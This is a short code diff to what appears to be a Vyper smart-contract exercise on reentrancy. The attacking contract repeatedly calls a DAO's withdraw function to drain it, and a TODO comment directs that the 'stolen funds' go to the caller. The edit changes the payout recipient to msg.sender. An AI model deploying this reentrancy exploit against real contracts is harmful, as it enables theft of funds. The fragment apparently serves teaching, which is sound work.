@@ -21,7 +21,7 @@ def _attack() -> bool:
     if self.dao_address.balance >0 :
         DAO(self.dao_address).withdraw()
         return True
-        
+
     return False
 
 @external
@@ -42,7 +42,7 @@ def attack(dao_address:address):
     
     # TODO: After the recursion has finished, all the stolen funds are held by this contract. Now, you need to send all funds (deposited and stolen) to the entity that called this contract
     if self._attack() == False:
-        send(self.owner_address, self.balance)
+        send(msg.sender, self.balance)
     
     pass
 
